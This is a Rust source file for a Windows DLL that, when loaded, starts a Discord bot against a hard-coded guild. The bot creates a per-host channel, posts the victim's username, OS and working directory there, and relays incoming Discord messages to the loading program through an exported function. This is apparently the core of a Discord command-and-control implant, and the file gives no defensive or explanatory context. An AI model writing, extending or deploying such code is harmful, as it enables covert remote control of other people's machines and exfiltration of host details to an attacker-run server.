use serenity::async_trait;
use serenity::model::channel::{Message, ChannelType};
use serenity::prelude::*;
use serenity::model::id::GuildId;
use serenity::Client;
use std::env;
use std::ffi::{CString, c_char};
use std::sync::{Arc, Mutex};
use std::collections::VecDeque;
use serenity::model::gateway::Ready;
use once_cell::sync::{Lazy, OnceCell};
use windows::Win32::Foundation::*;
use windows::Win32::System::SystemServices::*;
use std::thread;

type MessageQueue = Arc<Mutex<VecDeque<String>>>;

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        enqueue_message(msg.content.clone());
        let _ = msg.react(&ctx.http, '👍').await;
    }

    async fn ready(&self, ctx: Context, ready: Ready) {
        send_initial_data(&ctx).await;
        println!("{} is connected!", ready.user.name);
    }
}
async fn send_initial_data(ctx: &Context) {
    const MY_GUILD_ID: u64 = 1083863758146912297;
    let os = std::env::consts::OS;
    let current_user = std::env::var("USER").unwrap_or_else(|_| {
        std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string())
    });
    let session_id = format!("sess-{}-{}", os, current_user).to_lowercase().replace("\\", "-");

    let channels = match ctx.http.get_channels(MY_GUILD_ID).await {
        Ok(channels) => channels,
        Err(err) => {
            eprintln!("Error fetching channels: {:?}", err);
            return;
        }
    };

    if let Some(channel) = channels.iter().find(|ch| ch.name == session_id) {
        if let Err(err) = channel.id.say(&ctx.http, "Online").await {
            eprintln!("Error sending message: {:?}", err);
        }
    } else {
        let guild = GuildId(MY_GUILD_ID);
    
        let new_channel_result = guild.create_channel(&ctx.http, |c| {
            c.name(session_id.clone())
            .kind(ChannelType::Text)
        }).await;
        
        if let Ok(new_channel) = new_channel_result {
            let current_dir = match env::current_dir() {
                Ok(dir) => dir.display().to_string(),
                Err(e) => {
                    eprintln!("Error getting current directory: {}", e);
                    return; // Exit if there's an error
                }
            };
            let first_msg = format!(
                "Session *{}* opened! 🥳\n\n**User**: {}\n**OS**: {}\n**Current Directory**: {}",
                session_id, current_user, os, current_dir
            );
        
            if let Ok(message) = new_channel.id.say(&ctx.http, &first_msg).await {
                if let Err(_) = message.pin(&ctx.http).await {
                }
            }
        } else {
            // Handle the error if channel creation failed
            if let Err(err) = new_channel_result {
                eprintln!("Error creating channel: {:?}", err);
            }
        }
    }
}
fn enqueue_message(message: String) {
    let mut queue = MESSAGE_QUEUE.lock().unwrap();
    queue.push_back(message);
}


static MESSAGE_QUEUE: Lazy<MessageQueue> = Lazy::new(|| Arc::new(Mutex::new(VecDeque::new())));
static BOT_TASK: Lazy<OnceCell<thread::JoinHandle<()>>> = Lazy::new(|| OnceCell::new());

#[no_mangle]
pub fn attach_process() {
    let token = "YOUR_DISCORD_TOKEN";

    let bot_thread = thread::spawn(move || {
        let runtime = tokio::runtime::Runtime::new().expect("Failed to create Tokio runtime");

        runtime.block_on(async {
            let mut client = Client::builder(&token)
                .event_handler(Handler)
                .await
                .expect("Err creating client");

            if let Err(why) = client.start().await {
                eprintln!("Client error: {:?}", why);
            }
        });
    });
    BOT_TASK.set(bot_thread).expect("Failed to set bot task");
}

#[no_mangle]
pub extern "C" fn get_message() -> *const c_char {
    let mut queue = MESSAGE_QUEUE.lock().unwrap();
    if let Some(message) = queue.pop_front() {
        let c_string = CString::new(message).expect("CString conversion failed");
        c_string.into_raw()
    } else {
        std::ptr::null()
    }
}

#[no_mangle]
pub fn detach_process() {
    println!("Bot has been requested to shut down (not implemented).");
}

#[no_mangle]
#[allow(non_snake_case)]
extern "system" fn DllMain(
    _dll_module: HINSTANCE,
    call_reason: u32,
    _: *mut (),
) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => attach_process(),
        DLL_PROCESS_DETACH => detach_process(),
        _ => (),
    }
    true
}